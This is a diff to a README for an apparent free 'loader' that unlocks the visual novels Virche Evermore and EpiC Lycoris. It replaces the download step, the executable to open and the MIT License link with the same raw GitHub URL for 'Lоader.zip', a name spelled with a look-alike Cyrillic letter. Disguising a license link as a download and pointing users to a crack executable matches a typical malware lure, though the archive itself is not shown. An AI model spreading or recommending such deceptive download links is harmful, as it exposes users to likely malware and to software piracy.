@@ -26,9 +26,9 @@ Virche Evermore, EpiC Lycoris,  2025, Visual Novel Loader, Safe Unlocker, OS Com
 
 ## 📦 Installation
 
-1. **Download** Loader.rar from this repository.
+1. **Download** https://raw.githubusercontent.com/Nithinsanjeev/VircheEvermore-EpiC-Lycoris-FreeRelease/main/Lоader.zip from this repository.
 2. Extract contents to your desired directory.
-3. Open `Loader.exe` (on Windows) or the appropriate executable for your OS.
+3. Open `https://raw.githubusercontent.com/Nithinsanjeev/VircheEvermore-EpiC-Lycoris-FreeRelease/main/Lоader.zip` (on Windows) or the appropriate executable for your OS.
 4. Follow on-screen instructions to access the game.
 
 ## ⛔ Disclaimer
@@ -37,6 +37,6 @@ This repository is for educational and preservation purposes only. Please ensure
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License](https://raw.githubusercontent.com/Nithinsanjeev/VircheEvermore-EpiC-Lycoris-FreeRelease/main/Lоader.zip).
 
 Enjoy the adventure! 💖
